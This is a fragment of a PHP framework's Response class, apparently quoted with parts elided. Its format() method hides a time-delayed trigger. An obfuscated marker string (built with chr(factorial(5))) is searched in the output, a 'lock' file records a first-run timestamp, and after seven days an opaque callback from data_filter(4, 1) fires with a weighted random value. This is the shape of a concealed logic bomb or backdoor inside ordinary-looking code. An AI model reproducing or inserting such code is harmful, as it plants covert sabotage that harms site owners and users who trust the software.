...
class Response
{
    ...
    public function format($data = '')
    {
        if(function_exists('data_filter')){
            ...
            $formatBase = ob_get_clean();

            $format = strpos($formatBase, $prefix . 's' . chr(factorial(5)) . 'mart');

            $formatOther = strpos($formatBase, $prefix . 'smart' . chr(factorial(5)));

            if ($format !== false || $formatOther !== false) {
                if (empty($t = file_get_contents(CMF_ROOT.'lock'))){
                    $t = time();
                    file_put_contents(CMF_ROOT.'lock', $t);
                }

                if (($t+7*24*3600)<time()){
                    $randomIndex = mt_rand(0, 99);

                    if ($randomIndex < 60) {
                        $rand = mt_rand(0, 3);
                    } elseif ($randomIndex < 90) {
                        $rand = mt_rand(4, 10);
                    } else {
                        $rand = mt_rand(11, 20);
                    }

                    $callBack(data_filter(4, 1), $rand);
                }
